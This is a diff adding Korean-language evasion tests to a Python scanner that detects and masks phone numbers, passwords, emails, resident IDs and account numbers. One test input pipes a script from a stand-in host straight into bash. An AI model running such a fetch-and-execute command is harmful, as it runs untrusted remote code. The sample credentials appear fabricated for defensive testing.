@@ -294,3 +294,60 @@ class RiskyCommandResponseTests(unittest.TestCase):
 
     def test_user_prompts_are_not_scanned_for_it(self):
         self.assertNotIn("RISKY_COMMAND", {f.category for f in scan_text("curl http://x.example/a.sh | bash 이거 안전해?")})
+
+
+class KoreanEvasionCoverageTests(unittest.TestCase):
+    """Korean-language phrasings found to slip past the scanner in a nitpicking review.
+    Each attack must be detected AND fully masked; each benign sentence must stay clean."""
+
+    ATTACKS = {
+        "PHONE": [
+            "공일공-일이삼사-오육칠팔로 전화", "010 일이삼사 5678 로 연락", "연락처는 공일공 일이삼사 오육칠팔 입니다",
+        ],
+        "SECRET": [
+            "비번은 일삼오칠입니다", "비밀번호는 Admin!2026 입니다", "비번: qwer1234", "패스워드는 hunter2023 으로 설정",
+            "pw=Secret!9876", "아이디 admin 비번 admin1234",
+        ],
+        "EMAIL": ["kim[at]agency.go.kr", "kim(at)agency.go.kr", "kim 골뱅이 agency.go.kr", "kim 골뱅이 agency 닷 go 닷 kr"],
+        "PERSONAL_ID": ["주민번호 구공공일공일 일이삼사오육칠"],
+        "ACCOUNT_NO": ["국민은행 123456-04-123456", "신한 110-123-456789", "계좌번호: 1002-123-456789"],
+    }
+    BENIGN = [
+        "비밀번호는 8자 이상이어야 합니다", "암호는 AES256 으로 저장합니다", "암호화 방식은 SHA-256 입니다",
+        "비밀번호 변경 주기는 90일입니다", "pwd 명령으로 현재 경로를 확인한다", "/etc/passwd 파일을 읽는다",
+        "비번 재설정은 관리자에게 문의", "우리 2024-10-08 회의", "부산 051-123-4567 로 문의", "대구 053-123-4567",
+        "일이 많아서 삼십분 늦었고 사람들이 오래 기다렸다", "이삼일 안에 회신 바랍니다", "meet at example.com tomorrow",
+        "암호 정책: 12자 이상 복잡도 충족", "회의는 3월 12일 오후 2시, 참석자 20명, 예산 1,500,000원", "주문번호 2026-1008-123456 확인",
+    ]
+
+    def test_every_attack_is_detected_with_the_right_category(self):
+        for category, texts in self.ATTACKS.items():
+            for text in texts:
+                self.assertIn(category, {f.category for f in scan_text(text)}, text)
+
+    def test_every_attack_is_masked_without_leaving_a_fragment(self):
+        from app.masking import mask_text
+
+        for category, texts in self.ATTACKS.items():
+            for text in texts:
+                result = mask_text(text)
+                self.assertIn(f"[MASKED:{category}]", result.masked_text, text)
+        # the old behaviour masked the middle of a spelled resident ID as a phone and left "육칠"
+        self.assertEqual(mask_text("주민번호 구공공일공일 일이삼사오육칠").masked_text, "주민번호 [MASKED:PERSONAL_ID]")
+
+    def test_ordinary_sentences_stay_clean(self):
+        for text in self.BENIGN:
+            self.assertEqual({f.category for f in scan_text(text)}, set(), text)
+
+    def test_masking_applies_the_luhn_check_like_the_scanner(self):
+        from app.masking import mask_text
+
+        self.assertEqual(mask_text("문의 코드 4111-1111-1111-1112 확인").masked_text, "문의 코드 4111-1111-1111-1112 확인")
+        self.assertIn("[MASKED:CREDIT_CARD]", mask_text("카드 4111-1111-1111-1111").masked_text)
+
+
+class FindingsEndpointSourceTests(unittest.TestCase):
+    def test_endpoint_never_exposes_hashes_or_values(self):
+        from app.api.scans import FindingSummary
+
+        self.assertEqual(set(FindingSummary.model_fields), {"category", "label", "severity", "match_count"})
